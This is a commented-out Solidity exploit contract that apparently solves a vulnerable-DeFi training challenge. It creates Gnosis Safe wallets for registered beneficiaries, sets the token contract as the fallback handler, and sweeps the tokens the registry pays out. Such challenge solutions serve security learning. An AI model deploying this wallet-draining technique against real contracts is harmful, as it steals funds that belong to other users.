// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
// import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

// contract BackdoorExploit {
//   constructor(
//     address registryAddress,
//     address masterCopyAddress,
//     IGnosisSafeProxyFactory walletFactory,
//     IERC20 token,
//     address[] memory victims
//   ) {
//     // Create a wallet for each beneficiary.
//     for (uint256 i = 0; i < victims.length; i++) {
//       address beneficiary = victims[i];
//       address[] memory owners = new address[](1);
//       owners[0] = beneficiary;

//       address wallet = walletFactory.createProxyWithCallback(
//         masterCopyAddress, // Singleton, the Gnosis master copy
//         abi.encodeWithSelector( // Build initializer bytes array
//           IGnosisSafe.setup.selector, // Function signature to call, must be setup()
//           owners, // Must be exactly one of the registered beneficiaries
//           1, // Threshold, must be 1
//           address(0x0), // Optional delegate call address, don't care
//           0x0, // Optional delegate call data, don't care
//           address(token), // Specify the Token as fallback handler
//           address(0x0), // Payment token, don't care
//           0, // Payment, don't care
//           address(0x0) // Payment receiver, don't care
//         ),
//         0, // We don't care about the salt or what address the Wallet gets from it
//         registryAddress // Registry has the callback we want to exploit
//       );

//       // Wallet should now have received the DVT Tokens from the callback.

//       // We'll act as if the Wallet itself is a token,
//       // this transfer will be forwarded to the token contract.
//       IERC20(wallet).transfer(msg.sender, 10 ether);
//     }
//   }
// }
